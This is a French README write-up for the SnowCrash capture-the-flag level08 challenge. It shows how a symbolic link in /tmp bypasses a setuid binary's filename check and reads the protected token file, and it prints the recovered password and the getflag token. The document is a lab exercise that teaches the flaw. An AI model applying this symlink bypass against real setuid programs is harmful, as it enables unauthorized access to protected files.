# README - Exploitation du binaire level08

## Étapes suivies pour obtenir le Flag08

### 1. Identification des fichiers

Le répertoire contient deux fichiers principaux :

```bash
level08@SnowCrash:~$ ls -l
total 16
-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
-rw-------  1 flag08 flag08    26 Mar  5  2016 token
```

- **`level08`** : Un exécutable avec les permissions `setuid` et `setgid`, ce qui signifie qu'il s'exécute avec les privilèges de l'utilisateur `flag08`.
- **`token`** : Un fichier contenant probablement le flag, mais inaccessible directement par l'utilisateur `level08` en raison des permissions strictes.

### 2. Analyse du binaire `level08`

L'analyse avec la commande `strings` révèle que le programme utilise les fonctions suivantes :
- **`strstr`** : Permet de rechercher une sous-chaîne dans un nom de fichier.
- **`open`** et **`read`** : Utilisées pour accéder au fichier spécifié.
- **Messages pertinents** :
  - `You may not access '%s'` : Indique une validation basée sur le nom ou le chemin du fichier.

Ces informations suggèrent que le programme vérifie le nom du fichier pour empêcher l'accès direct au fichier `token`.

### 3. Exploitation de la vulnérabilité

Le programme semble uniquement vérifier le chemin fourni, mais il n'empêche pas l'utilisation de liens symboliques pointant vers le fichier `token`. Cette vulnérabilité peut être exploitée pour contourner les restrictions.

#### Étape 1 : Créer un lien symbolique vers le fichier `token`

Crée un lien symbolique dans un répertoire où nous avons les permissions nécessaires (par exemple, `/tmp`) :

```bash
ln -s /home/user/level08/token /tmp/ici
```

#### Étape 2 : Vérifier l'accès au lien symbolique

Bien que `cat` ne permette pas de lire le fichier via le lien symbolique :

```bash
cat /tmp/ici
# Résultat : Permission denied
```

L'exécutable `level08` peut cependant accéder au fichier via ce lien :

```bash
./level08 /tmp/ici
```

#### Étape 3 : Récupérer le flag

En exécutant la commande précédente, le programme renvoie le contenu du fichier `token` :

```bash
quif5eloekouj29ke0vouxean
```

### 4. Passage à l'utilisateur suivant

Utilisez le flag pour passer à l'utilisateur `flag08` :

```bash
su flag08
Password: quif5eloekouj29ke0vouxean
```

Une fois connecté, exécutez `getflag` pour récupérer le token :

```bash
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```

### 5. Accès à l'utilisateur suivant

Utilisez le token obtenu pour passer à l'utilisateur `level09` :

```bash
su level09
Password: 25749xKZ8L7DkSCwJkT9dyv6f
```

### Vulnérabilité expliquée

Le programme `level08` ne valide pas si le fichier ouvert via un lien symbolique est autorisé. La vérification est uniquement basée sur le chemin fourni en entrée. En créant un lien symbolique pointant vers le fichier `token`, il est possible de contourner cette vérification et de forcer le programme à accéder au contenu du fichier avec les privilèges de `flag08`.

Cette vulnérabilité montre l'importance de vérifier la destination finale des fichiers ouverts, même lorsqu'un lien symbolique est utilisé.